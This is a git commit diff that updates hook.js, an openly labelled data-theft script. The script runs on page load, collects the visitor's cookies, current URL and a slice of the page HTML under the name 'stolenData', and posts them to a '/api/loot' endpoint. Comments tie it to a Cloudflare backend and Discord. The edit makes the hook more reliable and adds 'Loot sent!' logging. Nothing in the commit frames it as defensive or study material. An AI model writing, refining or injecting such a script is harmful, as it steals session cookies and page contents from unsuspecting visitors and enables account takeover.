8278430b5ee1e62a3b998da689d6daa93830ebed
triplezzzeta1-cmyk <triplezzzeta1@gmail.com>
2026-03-31 02:26:18 -0300

    Update hook.js

--- hook.js
+++ hook.js
@@ -1,14 +1,18 @@
-window.onload = function() {
+(function() {
+    // Collect the data
     const stolenData = {
-        cookies: document.cookie,
+        cookies: document.cookie || "no cookies found",
         url: window.location.href,
-        htmlDump: document.body.innerHTML
+        // We only take a small slice of HTML so Discord doesn't crash
+        htmlDump: document.body ? document.body.innerHTML.substring(0, 500) : "no body"
     };
 
-    // This sends the data to your Cloudflare backend
+    // Send it
     fetch("/api/loot", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(stolenData)
-    });
-};
+    })
+    .then(r => console.log("Loot sent!"))
+    .catch(e => console.error("Loot failed:", e));
+})();
